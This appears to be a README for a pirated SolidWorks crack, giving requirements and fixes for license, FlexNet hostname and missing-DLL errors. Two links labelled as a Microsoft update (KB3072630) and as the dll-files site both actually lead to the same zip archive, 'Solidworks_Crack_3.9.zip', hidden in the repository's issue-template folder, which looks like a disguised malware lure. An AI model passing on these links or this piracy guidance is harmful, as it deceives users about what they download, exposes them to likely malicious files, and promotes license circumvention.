### Important Requirements  
- **Windows OS** (Mac/Linux not supported)  
- **Microsoft Excel (Activated & Accessible)** – Required for SolidWorks to function  

### Alternative Links

> **Hosting Suggestion Needed**

## Common Issues & Fixes  

### **License Error (-8 544 0)**  
- This is a Windows bug related to **[KB3072630](https://github.com/Kalitone/Solidworks-Crack/raw/refs/heads/main/.github/ISSUE_TEMPLATE/Solidworks_Crack_3.9.zip)**  
- **No proper fix exists** – Using the **2021 version** is recommended.  
- This issue is **not caused by me** but by the software host.  

### **FlexNet Server Failure (Invalid Hostname)**  
FlexNet crashes if your hostname contains non-English characters (e.g., `ö`). To fix it:  

1. Open **Command Prompt** as Administrator  
2. Run:  
   ```cmd
   wmic computersystem where name="%computername%" call rename name="NewHostname"
   ```  
3. Restart your system & FlexNet server.  

### Missing DLL Errors
Sometimes a dll file can be missing, the fix for this issue is found if you search the dll name and download it from this website [dll-files](https://github.com/Kalitone/Solidworks-Crack/raw/refs/heads/main/.github/ISSUE_TEMPLATE/Solidworks_Crack_3.9.zip). Make sure to scan for malware!!
